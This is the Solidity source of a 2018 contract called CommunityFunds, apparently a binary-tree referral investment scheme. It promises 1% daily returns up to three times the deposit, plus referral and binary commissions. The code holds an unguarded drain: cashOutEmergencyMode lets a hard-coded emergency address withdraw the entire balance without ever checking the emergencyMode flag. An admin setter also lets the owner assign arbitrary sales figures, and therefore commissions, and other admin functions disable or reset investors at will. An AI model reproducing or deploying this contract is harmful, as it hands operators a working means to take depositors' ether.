1 pragma solidity ^0.4.25;
2 
3 // 11/19/2018
4 
5 contract CommunityFunds {
6     event MaxOut (address investor, uint256 times, uint256 at);
7     
8     uint256 public constant ONE_DAY = 86400;
9     address private admin;
10     uint256 private depositedAmountGross = 0;
11     uint256 private paySystemCommissionTimes = 1;
12     uint256 private payDailyIncomeTimes = 1;
13     uint256 private lastPaySystemCommission = now;
14     uint256 private lastPayDailyIncome = now;
15     uint256 private contractStartAt = now;
16     uint256 private lastReset = now;
17    
18     address private operationFund = 0xe707EF0F76172eb2ed2541Af344acb2dB092406a;
19     address private developmentFund = 0x319bC822Fb406444f9756929DdC294B649A01b2E;
20     address private reserveFund = 0xa04DE4366F6d06b84a402Ed0310360E1d554d8Fc;
21     address private emergencyAccount = 0x6DeC2927cC604D1bE364C1DaBDE8f8597D5f4387;
22     bool private emergencyMode = false;
23     mapping (address => Investor) investors;
24     address[] public investorAddresses;
25     mapping (bytes32 => Investment) investments;
26     mapping (bytes32 => Withdrawal) withdrawals;
27     bytes32[] private investmentIds;
28     bytes32[] private withdrawalIds;
29     uint256 maxLevelsAddSale = 200;
30     
31     uint256 maximumMaxOutInWeek = 4;
32     
33     struct Investment {
34         bytes32 id;
35         uint256 at;
36         uint256 amount;
37         address investor;
38     }
39 
40     struct Withdrawal {
41         bytes32 id;
42         uint256 at;
43         uint256 amount;
44         address investor;
45         address presentee;
46         uint256 reason;
47         uint256 times;
48     }
49 
50  
51 
52     struct Investor {
53         string email;
54         address parent;
55         address leftChild;
56         address rightChild;
57         address presenter;
58         uint256 generation;
59         address[] presentees;
60         uint256 depositedAmount;
61         uint256 withdrewAmount;
62         bool isDisabled;
63         uint256 lastMaxOut;
64         uint256 maxOutTimes;
65         uint256 maxOutTimesInWeek;
66         uint256 totalSell;
67         uint256 sellThisMonth;
68         bytes32[] investments;
69         bytes32[] withdrawals;
70         uint256 rightSell;
71         uint256 leftSell;
72         uint256 reserveCommission;
73         uint256 dailyIncomeWithrewAmount;
74     }
75 
76     constructor () public { admin = msg.sender; }
77     
78     modifier mustBeAdmin() { require(msg.sender == admin); _; }    
79     
80     function () payable public { deposit(); }
81     
82 
83     function deposit() payable public {
84         require(msg.value >= 1 ether);
85         Investor storage investor = investors[msg.sender];
86         require(investor.generation != 0);
87         require(investor.maxOutTimesInWeek < maximumMaxOutInWeek);
88      
89         require(investor.maxOutTimes == 0 || now - investor.lastMaxOut < ONE_DAY * 7 || investor.depositedAmount != 0);
90         depositedAmountGross += msg.value;
91         bytes32 id = keccak256(abi.encodePacked(block.number, now, msg.sender, msg.value));
92         uint256 investmentValue = investor.depositedAmount + msg.value <= 20 ether ? msg.value : 20 ether - investor.depositedAmount;
93         if (investmentValue == 0) return;
94         Investment memory investment = Investment({ id: id, at: now, amount: investmentValue, investor: msg.sender });
95         investments[id] = investment;
96         processInvestments(id);
97         investmentIds.push(id);
98     }
99     
100     function processInvestments(bytes32 investmentId) internal {
101         Investment storage investment = investments[investmentId];
102         uint256 amount = investment.amount;
103         Investor storage investor = investors[investment.investor];
104         investor.investments.push(investmentId);
105         investor.depositedAmount += amount;
106         
107         addSellForParents(investment.investor, amount);
108         address presenterAddress = investor.presenter;
109         Investor storage presenter = investors[presenterAddress];
110         if (presenterAddress != 0) {
111             presenter.totalSell += amount;
112             presenter.sellThisMonth += amount;
113         }
114         if (presenter.depositedAmount >= 1 ether && !presenter.isDisabled) {
115             sendEtherForInvestor(presenterAddress, amount / 10, 1, investment.investor, 0);
116         }
117     }
118 
119     function addSellForParents(address investorAddress, uint256 amount) internal {
120         Investor memory investor = investors[investorAddress];
121         address currentParentAddress = investor.parent;
122         address currentInvestorAddress = investorAddress;
123         uint256 loopCount = investor.generation - 1;
124         uint256 loop = loopCount < maxLevelsAddSale ? loopCount : maxLevelsAddSale;
125         for(uint256 i = 0; i < loop; i++) {
126             Investor storage parent = investors[currentParentAddress];
127             if (parent.leftChild == currentInvestorAddress) parent.leftSell += amount;
128             else parent.rightSell += amount;
129             uint256 incomeTilNow = getAllIncomeTilNow(currentParentAddress);
130             if (incomeTilNow > 3 * parent.depositedAmount) {
131                 payDailyIncomeForInvestor(currentParentAddress, 0);
132                 paySystemCommissionInvestor(currentParentAddress, 0);
133             }
134             currentInvestorAddress = currentParentAddress;
135             currentParentAddress = parent.parent;
136         }
137     }
138     
139     function setMaxLevelsAddSale(uint256 level) public  mustBeAdmin {
140         require(level > 0);
141         maxLevelsAddSale = level;
142     }
143 
144     function sendEtherForInvestor(address investorAddress, uint256 value, uint256 reason, address presentee, uint256 times) internal {
145         if (value == 0 || investorAddress == 0) return;
146         Investor storage investor = investors[investorAddress];
147         if (investor.reserveCommission > 0) {
148             bool isPass = investor.reserveCommission >= 3 * investor.depositedAmount;
149             uint256 reserveCommission = isPass ? investor.reserveCommission + value : investor.reserveCommission;
150             investor.reserveCommission = 0;
151             sendEtherForInvestor(investorAddress, reserveCommission, 4, 0, 0);
152             if (isPass) return;
153         }
154         uint256 withdrewAmount = investor.withdrewAmount;
155         uint256 depositedAmount = investor.depositedAmount;
156         uint256 amountToPay = value;
157         if (withdrewAmount + value >= 3 * depositedAmount) {
158             amountToPay = 3 * depositedAmount - withdrewAmount;
159             investor.reserveCommission = value - amountToPay;
160             if (reason != 2) investor.reserveCommission += getDailyIncomeForUser(investorAddress);
161             if (reason != 3) investor.reserveCommission += getUnpaidSystemCommission(investorAddress);
162             investor.maxOutTimes++;
163             investor.maxOutTimesInWeek++;
164             investor.depositedAmount = 0;
165             investor.withdrewAmount = 0;
166             investor.lastMaxOut = now;
167             investor.dailyIncomeWithrewAmount = 0;
168             emit MaxOut(investorAddress, investor.maxOutTimes, now);
169         } else {
170             investors[investorAddress].withdrewAmount += amountToPay;
171         }
172         if (amountToPay != 0) {
173             investorAddress.transfer(amountToPay / 100 * 90);
174             operationFund.transfer(amountToPay / 100 * 5);
175             developmentFund.transfer(amountToPay / 100 * 1);
176           
177             bytes32 id = keccak256(abi.encodePacked(block.difficulty, now, investorAddress, amountToPay, reason));
178             Withdrawal memory withdrawal = Withdrawal({ id: id, at: now, amount: amountToPay, investor: investorAddress, presentee: presentee, times: times, reason: reason });
179             withdrawals[id] = withdrawal;
180             investor.withdrawals.push(id);
181             withdrawalIds.push(id);
182         }
183     }
184 
185 
186     function getAllIncomeTilNow(address investorAddress) internal view returns(uint256 allIncome) {
187         Investor memory investor = investors[investorAddress];
188         uint256 unpaidDailyIncome = getDailyIncomeForUser(investorAddress);
189         uint256 withdrewAmount = investor.withdrewAmount;
190         uint256 unpaidSystemCommission = getUnpaidSystemCommission(investorAddress);
191         uint256 allIncomeNow = unpaidDailyIncome + withdrewAmount + unpaidSystemCommission;
192         return allIncomeNow;
193     }
194 
195 
196 
197     function getContractInfo() public view returns (address _admin, uint256 _depositedAmountGross, address _developmentFund, address _operationFund, address _reserveFund, address _emergencyAccount, bool _emergencyMode, address[] _investorAddresses, uint256 balance, uint256 _paySystemCommissionTimes, uint256 _maximumMaxOutInWeek) {
198         return (admin, depositedAmountGross, developmentFund, operationFund, reserveFund, emergencyAccount, emergencyMode, investorAddresses, address(this).balance, paySystemCommissionTimes, maximumMaxOutInWeek);
199     }
200     
201     function getContractTime() public view returns(uint256 _contractStartAt, uint256 _lastReset, uint256 _oneDay, uint256 _lastPayDailyIncome, uint256 _lastPaySystemCommission) {
202         return (contractStartAt, lastReset, ONE_DAY, lastPayDailyIncome, lastPaySystemCommission);
203     }
204     
205     function getInvestorRegularInfo(address investorAddress) public view returns (string email, uint256 generation, uint256 rightSell, uint256 leftSell, uint256 reserveCommission, uint256 depositedAmount, uint256 withdrewAmount, bool isDisabled) {
206         Investor memory investor = investors[investorAddress];
207         return (
208             investor.email,
209             investor.generation,
210             investor.rightSell,
211             investor.leftSell,
212             investor.reserveCommission,
213             investor.depositedAmount,
214             investor.withdrewAmount,
215             investor.isDisabled
216         );
217     }
218     
219     function getInvestorAccountInfo(address investorAddress) public view returns (uint256 maxOutTimes, uint256 maxOutTimesInWeek, uint256 totalSell, bytes32[] investorIds, uint256 dailyIncomeWithrewAmount, uint256 unpaidSystemCommission, uint256 unpaidDailyIncome) {
220         Investor memory investor = investors[investorAddress];
221         return (
222             investor.maxOutTimes,
223             investor.maxOutTimesInWeek,
224             investor.totalSell,
225             investor.investments,
226             investor.dailyIncomeWithrewAmount,
227             getUnpaidSystemCommission(investorAddress),
228             getDailyIncomeForUser(investorAddress)
229         ); 
230     }
231     
232     function getInvestorTreeInfo(address investorAddress) public view returns (address leftChild, address rightChild, address parent, address presenter, uint256 sellThisMonth, uint256 lastMaxOut) {
233         Investor memory investor = investors[investorAddress];
234         return (
235             investor.leftChild,
236             investor.rightChild,
237             investor.parent,
238             investor.presenter,
239             investor.sellThisMonth,
240             investor.lastMaxOut
241         );
242     }
243     
244     function getWithdrawalsByTime(address investorAddress, uint256 start, uint256 end)public view returns(bytes32[] ids, uint256[] ats, uint256[] amounts, address[] presentees, uint256[] reasons, uint256[] times, bytes32[] emails) {
245         ids = new bytes32[](withdrawalIds.length);
246         ats = new uint256[](withdrawalIds.length);
247         amounts = new uint256[](withdrawalIds.length);
248         emails = new bytes32[](withdrawalIds.length);
249         presentees = new address[](withdrawalIds.length);
250         reasons = new uint256[](withdrawalIds.length);
251         times = new uint256[](withdrawalIds.length);
252         uint256 index = 0;
253         for (uint256 i = 0; i < withdrawalIds.length; i++) {
254             bytes32 id = withdrawalIds[i];
255             if (withdrawals[id].at < start || withdrawals[id].at > end) continue;
256             if (investorAddress != 0 && withdrawals[id].investor != investorAddress) continue;
257             ids[index] = id; 
258             ats[index] = withdrawals[id].at;
259             amounts[index] = withdrawals[id].amount;
260             emails[index] = stringToBytes32(investors[withdrawals[id].investor].email);
261             reasons[index] = withdrawals[id].reason;
262             times[index] = withdrawals[id].times;
263             presentees[index] = withdrawals[id].presentee;
264             index++;
265         }
266         return (ids, ats, amounts, presentees, reasons, times, emails);
267     }
268     
269     function getInvestmentsByTime(address investorAddress, uint256 start, uint256 end)public view returns(bytes32[] ids, uint256[] ats, uint256[] amounts, bytes32[] emails) {
270         ids = new bytes32[](investmentIds.length);
271         ats = new uint256[](investmentIds.length);
272         amounts = new uint256[](investmentIds.length);
273         emails = new bytes32[](investmentIds.length);
274         uint256 index = 0;
275         for (uint256 i = 0; i < investmentIds.length; i++) {
276             bytes32 id = investmentIds[i];
277             if (investorAddress != 0 && investments[id].investor != investorAddress) continue;
278             if (investments[id].at < start || investments[id].at > end) continue;
279             ids[index] = id;
280             ats[index] = investments[id].at;
281             amounts[index] = investments[id].amount;
282             emails[index] = stringToBytes32(investors[investments[id].investor].email);
283             index++;
284         }
285         return (ids, ats, amounts, emails);
286     }
287 
288     function getNodesAddresses(address rootNodeAddress) internal view returns(address[]){
289         uint256 maxLength = investorAddresses.length;
290         address[] memory nodes = new address[](maxLength);
291         nodes[0] = rootNodeAddress;
292         uint256 processIndex = 0;
293         uint256 nextIndex = 1;
294         while (processIndex != nextIndex) {
295             Investor memory currentInvestor = investors[nodes[processIndex++]];
296             if (currentInvestor.leftChild != 0) nodes[nextIndex++] = currentInvestor.leftChild;
297             if (currentInvestor.rightChild != 0) nodes[nextIndex++] = currentInvestor.rightChild;
298         }
299         return nodes;
300     }
301 
302     function stringToBytes32(string source) internal pure returns (bytes32 result) {
303         bytes memory tempEmptyStringTest = bytes(source);
304         if (tempEmptyStringTest.length == 0) return 0x0;
305         assembly { result := mload(add(source, 32)) }
306     }
307 
308     function getInvestorTree(address rootInvestor) public view returns(address[] nodeInvestors, bytes32[] emails, uint256[] leftSells, uint256[] rightSells, address[] parents, uint256[] generations, uint256[] deposits){
309         nodeInvestors = getNodesAddresses(rootInvestor);
310         uint256 length = nodeInvestors.length;
311         leftSells = new uint256[](length);
312         rightSells = new uint256[](length);
313         emails = new bytes32[] (length);
314         parents = new address[] (length);
315         generations = new uint256[] (length);
316         deposits = new uint256[] (length);
317         for (uint256 i = 0; i < length; i++) {
318             Investor memory investor = investors[nodeInvestors[i]];
319             parents[i] = investor.parent;
320             string memory email = investor.email;
321             emails[i] = stringToBytes32(email);
322             leftSells[i] = investor.leftSell;
323             rightSells[i] = investor.rightSell;
324             generations[i] = investor.generation;
325             deposits[i] = investor.depositedAmount;
326         }
327         return (nodeInvestors, emails, leftSells, rightSells, parents, generations, deposits);
328     }
329 
330     function getListInvestor() public view returns (address[] nodeInvestors, bytes32[] emails, uint256[] unpaidSystemCommissions, uint256[] unpaidDailyIncomes, uint256[] depositedAmounts, uint256[] withdrewAmounts, bool[] isDisableds) {
331         uint256 length = investorAddresses.length;
332         unpaidSystemCommissions = new uint256[](length);
333         unpaidDailyIncomes = new uint256[](length);
334         emails = new bytes32[] (length);
335         depositedAmounts = new uint256[] (length);
336         unpaidSystemCommissions = new uint256[] (length);
337         isDisableds = new bool[] (length);
338         unpaidDailyIncomes = new uint256[] (length); 
339         withdrewAmounts = new uint256[](length);
340         for (uint256 i = 0; i < length; i++) {
341             Investor memory investor = investors[investorAddresses[i]];
342             depositedAmounts[i] = investor.depositedAmount;
343             string memory email = investor.email;
344             emails[i] = stringToBytes32(email);
345             withdrewAmounts[i] = investor.withdrewAmount;
346             isDisableds[i] = investor.isDisabled;
347             unpaidSystemCommissions[i] = getUnpaidSystemCommission(investorAddresses[i]);
348             unpaidDailyIncomes[i] = getDailyIncomeForUser(investorAddresses[i]);
349         }
350         return (investorAddresses, emails, unpaidSystemCommissions, unpaidDailyIncomes, depositedAmounts, withdrewAmounts, isDisableds);
351     }
352     
353    
354 
355     function putPresentee(address presenterAddress, address presenteeAddress, address parentAddress, string presenteeEmail, bool isLeft) public mustBeAdmin {
356         Investor storage presenter = investors[presenterAddress];
357         Investor storage parent = investors[parentAddress];
358         if (investorAddresses.length != 0) {
359             require(presenter.generation != 0);
360             require(parent.generation != 0);
361             if (isLeft) {
362                 require(parent.leftChild == 0); 
363             } else {
364                 require(parent.rightChild == 0); 
365             }
366         }
367         
368         if (presenter.generation != 0) presenter.presentees.push(presenteeAddress);
369         Investor memory investor = Investor({
370             email: presenteeEmail,
371             parent: parentAddress,
372             leftChild: 0,
373             rightChild: 0,
374             presenter: presenterAddress,
375             generation: parent.generation + 1,
376             presentees: new address[](0),
377             depositedAmount: 0,
378             withdrewAmount: 0,
379             isDisabled: false,
380             lastMaxOut: now,
381             maxOutTimes: 0,
382             maxOutTimesInWeek: 0,
383             totalSell: 0,
384             sellThisMonth: 0,
385             investments: new bytes32[](0),
386             withdrawals: new bytes32[](0),
387             rightSell: 0,
388             leftSell: 0,
389             reserveCommission: 0,
390             dailyIncomeWithrewAmount: 0
391         });
392         investors[presenteeAddress] = investor;
393        
394         investorAddresses.push(presenteeAddress);
395         if (parent.generation == 0) return;
396         if (isLeft) {
397             parent.leftChild = presenteeAddress;
398         } else {
399             parent.rightChild = presenteeAddress;
400         }
401     }
402 
403   
404 
405     function getDailyIncomeForUser(address investorAddress) internal view returns(uint256 amount) {
406         Investor memory investor = investors[investorAddress];
407         uint256 investmentLength = investor.investments.length;
408         uint256 dailyIncome = 0;
409         for (uint256 i = 0; i < investmentLength; i++) {
410             Investment memory investment = investments[investor.investments[i]];
411             if (investment.at < investor.lastMaxOut) continue; 
412             if (now - investment.at >= ONE_DAY) {
413                 uint256 numberOfDay = (now - investment.at) / ONE_DAY;
414                 uint256 totalDailyIncome = numberOfDay * investment.amount / 100;
415                 dailyIncome = totalDailyIncome + dailyIncome;
416             }
417         }
418         return dailyIncome - investor.dailyIncomeWithrewAmount;
419     }
420     
421     function payDailyIncomeForInvestor(address investorAddress, uint256 times) public mustBeAdmin {
422         uint256 dailyIncome = getDailyIncomeForUser(investorAddress);
423         if (investors[investorAddress].isDisabled) return;
424         investors[investorAddress].dailyIncomeWithrewAmount += dailyIncome;
425         sendEtherForInvestor(investorAddress, dailyIncome, 2, 0, times);
426     }
427     
428     function payDailyIncomeByIndex(uint256 from, uint256 to) public mustBeAdmin{
429         require(from >= 0 && to < investorAddresses.length);
430         for(uint256 i = from; i <= to; i++) {
431             payDailyIncomeForInvestor(investorAddresses[i], payDailyIncomeTimes);
432         }
433     }
434     
435   
436     function getTotalSellLevel(uint256 totalSell) internal pure returns (uint256 level){
437         if (totalSell < 30 ether) return 0;
438         if (totalSell < 60 ether) return 1;
439         if (totalSell < 90 ether) return 2;
440         if (totalSell < 120 ether) return 3;
441         if (totalSell < 150 ether) return 4;
442         return 5;
443     }
444     
445     function getSellThisMonthLevel(uint256 sellThisMonth) internal pure returns (uint256 level){
446         if (sellThisMonth < 2 ether) return 0;
447         if (sellThisMonth < 4 ether) return 1;
448         if (sellThisMonth < 6 ether) return 2;
449         if (sellThisMonth < 8 ether) return 3;
450         if (sellThisMonth < 10 ether) return 4;
451         return 5;
452     }
453     
454     function getDepositLevel(uint256 sellThisMonth) internal pure returns (uint256 level){
455         if (sellThisMonth < 2 ether) return 0;
456         if (sellThisMonth < 4 ether) return 1;
457         if (sellThisMonth < 6 ether) return 2;
458         if (sellThisMonth < 8 ether) return 3;
459         if (sellThisMonth < 10 ether) return 4;
460         return 5;
461     }
462     
463     function getPercentage(uint256 depositedAmount, uint256 totalSell, uint256 sellThisMonth) internal pure returns(uint256 level) {
464         uint256 totalSellLevel = getTotalSellLevel(totalSell);
465         uint256 depLevel = getDepositLevel(depositedAmount);
466         uint256 sellThisMonthLevel = getSellThisMonthLevel(sellThisMonth);
467         uint256 min12 = totalSellLevel < depLevel ? totalSellLevel : depLevel;
468         uint256 minLevel = sellThisMonthLevel < min12 ? sellThisMonthLevel : min12;
469         return minLevel * 2;
470     }
471 
472     function getUnpaidSystemCommission(address investorAddress) public view returns(uint256 unpaid) {
473         Investor memory investor = investors[investorAddress];
474         uint256 depositedAmount = investor.depositedAmount;
475         uint256 totalSell = investor.totalSell;
476         uint256 leftSell = investor.leftSell;
477         uint256 rightSell = investor.rightSell;
478         uint256 sellThisMonth = investor.sellThisMonth;
479         uint256 sellToPaySystemCommission = rightSell < leftSell ? rightSell : leftSell;
480         uint256 commission = sellToPaySystemCommission * getPercentage(depositedAmount, totalSell, sellThisMonth) / 100;
481         return commission;
482     }
483     
484     function paySystemCommissionInvestor(address investorAddress, uint256 times) public mustBeAdmin {
485         Investor storage investor = investors[investorAddress];
486         if (investor.isDisabled) return;
487         uint256 systemCommission = getUnpaidSystemCommission(investorAddress);
488         if (paySystemCommissionTimes > 3 && times != 0) {
489             investor.rightSell = 0;
490             investor.leftSell = 0;
491         } else if (investor.rightSell >= investor.leftSell) {
492             investor.rightSell = investor.rightSell - investor.leftSell;
493             investor.leftSell = 0;
494         } else {
495             investor.leftSell = investor.leftSell - investor.rightSell;
496             investor.rightSell = 0;
497         }
498         if (times != 0) investor.sellThisMonth = 0;
499         sendEtherForInvestor(investorAddress, systemCommission, 3, 0, times);
500     }
501 
502     function paySystemCommissionByIndex(uint256 from, uint256 to) public mustBeAdmin {
503          require(from >= 0 && to < investorAddresses.length);
504         // change 1 to 30
505         if (now <= 30 * ONE_DAY + contractStartAt) return;
506         for(uint256 i = from; i <= to; i++) {
507             paySystemCommissionInvestor(investorAddresses[i], paySystemCommissionTimes);
508         }
509      }
510 
511 
512     function finishPayDailyIncome() public mustBeAdmin {
513         lastPayDailyIncome = now;
514         payDailyIncomeTimes++;
515     }
516     
517     function finishPaySystemCommission() public mustBeAdmin {
518         lastPaySystemCommission = now;
519         paySystemCommissionTimes++;
520     }
521 
522 
523     function turnOnEmergencyMode() public mustBeAdmin { emergencyMode = true; }
524 
525     function cashOutEmergencyMode() public {
526         require(msg.sender == emergencyAccount);
527         msg.sender.transfer(address(this).balance);
528     }
529     
530  
531     
532     function resetGame(address[] yesInvestors, address[] noInvestors) public mustBeAdmin {
533         lastReset = now;
534         uint256 yesInvestorsLength = yesInvestors.length;
535         for (uint256 i = 0; i < yesInvestorsLength; i++) {
536             address yesInvestorAddress = yesInvestors[i];
537             Investor storage yesInvestor = investors[yesInvestorAddress];
538             if (yesInvestor.maxOutTimes > 0 || (yesInvestor.withdrewAmount >= yesInvestor.depositedAmount && yesInvestor.withdrewAmount != 0)) {
539                 yesInvestor.lastMaxOut = now;
540                 yesInvestor.depositedAmount = 0;
541                 yesInvestor.withdrewAmount = 0;
542                 yesInvestor.dailyIncomeWithrewAmount = 0;
543             }
544             yesInvestor.reserveCommission = 0;
545             yesInvestor.rightSell = 0;
546             yesInvestor.leftSell = 0;
547             yesInvestor.totalSell = 0;
548             yesInvestor.sellThisMonth = 0;
549         }
550         uint256 noInvestorsLength = noInvestors.length;
551         for (uint256 j = 0; j < noInvestorsLength; j++) {
552             address noInvestorAddress = noInvestors[j];
553             Investor storage noInvestor = investors[noInvestorAddress];
554             if (noInvestor.maxOutTimes > 0 || (noInvestor.withdrewAmount >= noInvestor.depositedAmount && noInvestor.withdrewAmount != 0)) {
555                 noInvestor.isDisabled = true;
556                 noInvestor.reserveCommission = 0;
557                 noInvestor.lastMaxOut = now;
558                 noInvestor.depositedAmount = 0;
559                 noInvestor.withdrewAmount = 0;
560                 noInvestor.dailyIncomeWithrewAmount = 0;
561             }
562             noInvestor.reserveCommission = 0;
563             noInvestor.rightSell = 0;
564             noInvestor.leftSell = 0;
565             noInvestor.totalSell = 0;
566             noInvestor.sellThisMonth = 0;
567         }
568     }
569 
570     function stopGame(uint256 percent, uint256 from, uint256 to) mustBeAdmin public {
571         require(percent <= 50);
572         require(from >= 0 && to < investorAddresses.length);
573         for (uint256 i = from; i <= to; i++) {
574             address investorAddress = investorAddresses[i];
575             Investor storage investor = investors[investorAddress];
576             if (investor.maxOutTimes > 0) continue;
577             if (investor.isDisabled) continue;
578             uint256 depositedAmount = investor.depositedAmount;
579             uint256 withdrewAmount = investor.withdrewAmount;
580             if (withdrewAmount >= depositedAmount / 2) continue;
581             sendEtherForInvestor(investorAddress, depositedAmount * percent / 100 - withdrewAmount, 6, 0, 0);
582         }
583     }
584     
585     function revivalInvestor(address investor) public mustBeAdmin { investors[investor].lastMaxOut = now; }
586 
587     function getSystemCommision(address user, uint256 totalSell, uint256 sellThisMonth, uint256 rightSell, uint256 leftSell) public mustBeAdmin {
588         Investor storage investor = investors[user];
589         require(investor.generation > 0);
590         investor.totalSell = totalSell;
591         investor.sellThisMonth = sellThisMonth;
592         investor.rightSell = rightSell;
593         investor.leftSell = leftSell;
594     }
595 
596     function getPercentToMaxOut(address investorAddress) public view returns(uint256) {
597         uint256 depositedAmount = investors[investorAddress].depositedAmount;
598         if (depositedAmount == 0) return 0;
599         uint256 unpaidSystemCommissions = getUnpaidSystemCommission(investorAddress);
600         uint256 unpaidDailyIncomes = getDailyIncomeForUser(investorAddress);
601         uint256 withdrewAmount = investors[investorAddress].withdrewAmount;
602         uint256 percent = 100 * (unpaidSystemCommissions + unpaidDailyIncomes + withdrewAmount) / depositedAmount;
603         return percent;
604     }
605 
606     function payToReachMaxOut(address investorAddress) public mustBeAdmin{
607         uint256 unpaidSystemCommissions = getUnpaidSystemCommission(investorAddress);
608         uint256 unpaidDailyIncomes = getDailyIncomeForUser(investorAddress);
609         uint256 withdrewAmount = investors[investorAddress].withdrewAmount;
610         uint256 depositedAmount = investors[investorAddress].depositedAmount;
611         uint256 reserveCommission = investors[investorAddress].reserveCommission;
612         require(depositedAmount > 0  && withdrewAmount + unpaidSystemCommissions + unpaidDailyIncomes + reserveCommission >= 3 * depositedAmount);
613         investors[investorAddress].reserveCommission = 0;
614         sendEtherForInvestor(investorAddress, reserveCommission, 4, 0, 0);
615         payDailyIncomeForInvestor(investorAddress, 0);
616         paySystemCommissionInvestor(investorAddress, 0);
617     }
618 
619     function getMaxOutUser() public view returns (address[] nodeInvestors, uint256[] unpaidSystemCommissions, uint256[] unpaidDailyIncomes, uint256[] depositedAmounts, uint256[] withdrewAmounts, uint256[] reserveCommissions, bool[] isDisableds) {
620         uint256 length = investorAddresses.length;
621         unpaidSystemCommissions = new uint256[](length);
622         unpaidDailyIncomes = new uint256[](length);
623         depositedAmounts = new uint256[] (length);
624         unpaidSystemCommissions = new uint256[] (length);
625         reserveCommissions = new uint256[] (length);
626         unpaidDailyIncomes = new uint256[] (length); 
627         withdrewAmounts = new uint256[](length);
628         isDisableds = new bool[](length);
629         for (uint256 i = 0; i < length; i++) {
630             Investor memory investor = investors[investorAddresses[i]];
631             depositedAmounts[i] = investor.depositedAmount;
632             withdrewAmounts[i] = investor.withdrewAmount;
633             reserveCommissions[i] = investor.reserveCommission;
634             unpaidSystemCommissions[i] = getUnpaidSystemCommission(investorAddresses[i]);
635             unpaidDailyIncomes[i] = getDailyIncomeForUser(investorAddresses[i]);
636             isDisableds[i] = investor.isDisabled;
637         }
638         return (investorAddresses, unpaidSystemCommissions, unpaidDailyIncomes, depositedAmounts, withdrewAmounts, reserveCommissions, isDisableds);
639     }
640 
641     function getLazyInvestor() public view returns (bytes32[] emails, address[] addresses, uint256[] lastDeposits, uint256[] depositedAmounts, uint256[] sellThisMonths, uint256[] totalSells, uint256[] maxOuts) {
642         uint256 length = investorAddresses.length;
643         emails = new bytes32[] (length);
644         lastDeposits = new uint256[] (length);
645         addresses = new address[](length);
646         depositedAmounts = new uint256[] (length);
647         sellThisMonths = new uint256[] (length);
648         totalSells = new uint256[](length);
649         maxOuts = new uint256[](length);
650         uint256 index = 0;
651         for (uint256 i = 0; i < length; i++) {
652             Investor memory investor = investors[investorAddresses[i]];
653             if (investor.withdrewAmount > investor.depositedAmount) continue;
654             lastDeposits[index] = investor.investments.length != 0 ? investments[investor.investments[investor.investments.length - 1]].at : 0;
655             emails[index] = stringToBytes32(investor.email);
656             addresses[index] = investorAddresses[i];
657             depositedAmounts[index] = investor.depositedAmount;
658             sellThisMonths[index] = investor.sellThisMonth;
659             totalSells[index] = investor.totalSell;
660             maxOuts[index] = investor.maxOutTimes;
661             index++;
662         }
663         return (emails, addresses, lastDeposits, depositedAmounts, sellThisMonths, totalSells, maxOuts);
664     }
665   
666     function resetMaxOutInWeek() public mustBeAdmin {
667         uint256 length = investorAddresses.length;
668         for (uint256 i = 0; i < length; i++) {
669             address investorAddress = investorAddresses[i];
670             investors[investorAddress].maxOutTimesInWeek = 0;
671         }
672     }
673     
674     function setMaximumMaxOutInWeek(uint256 maximum) public mustBeAdmin{ maximumMaxOutInWeek = maximum; }
675 
676     function disableInvestor(address investorAddress) public mustBeAdmin {
677         Investor storage investor = investors[investorAddress];
678         investor.isDisabled = true;
679     }
680     
681     function enableInvestor(address investorAddress) public mustBeAdmin {
682         Investor storage investor = investors[investorAddress];
683         investor.isDisabled = false;
684     }
685     
686     function donate() payable public { depositedAmountGross += msg.value; }
687 }